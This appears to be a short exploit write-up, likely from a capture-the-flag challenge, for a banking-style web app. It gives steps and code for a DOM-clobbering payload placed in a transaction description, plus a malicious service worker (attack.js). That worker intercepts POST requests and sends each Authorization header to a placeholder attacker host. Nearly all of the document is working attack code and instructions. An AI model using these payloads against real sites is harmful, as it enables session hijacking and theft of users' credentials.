Host `attack.js` on a server and replace the URL with your URL. Then send a transaction to your support user with 0 money and the description as in `dom_clobber.txt`. Replace the URL again. You get the recipient id of your support user via the GraphQL transactions query.

#### attack.js

```js
self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);
    console.log("Request to -> " + url);
    if (event.request.method == "POST") {
        auth = event.request.headers.get("Authorization");
        console.log(auth);

        const url = "//ATTACKER_SITE?auth=" + auth;
        // Send data to third party
        fetch(url);

        event.respondWith(fetch(event.request));
    }
});
```

#### dom_clobber.html

```html
<div hidden id="lng">/ATTACKER_SITE?</div>
```
